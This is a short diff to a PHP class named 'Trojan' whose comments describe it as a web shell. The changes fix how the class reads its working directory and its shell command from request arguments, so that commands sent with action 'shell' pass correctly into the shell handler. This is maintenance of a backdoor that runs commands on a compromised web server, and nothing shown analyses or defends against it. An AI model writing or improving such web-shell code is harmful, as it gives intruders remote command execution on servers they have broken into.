@@ -16,7 +16,7 @@ class Trojan{
      */
     public function __construct($request){
         # emulate cwd persistence
-        $this->cwd = ($request['args']['cwd'] != '') ? $request['cwd'] : trim(`pwd`);
+        $this->cwd = ($request['args']['cwd'] != '') ? $request['args']['cwd'] : trim(`pwd`);
     }
 
     /**
@@ -28,7 +28,7 @@ class Trojan{
         # if the specified action was 'shell', pipe the command directly into
         # the web shell.
         if($json['action'] == 'shell'){
-            $this->process_shell_command($json['args']);
+            $this->process_shell_command($json['args']['cmd']);
         }
 
         # otherwise, simply invoke the method directly
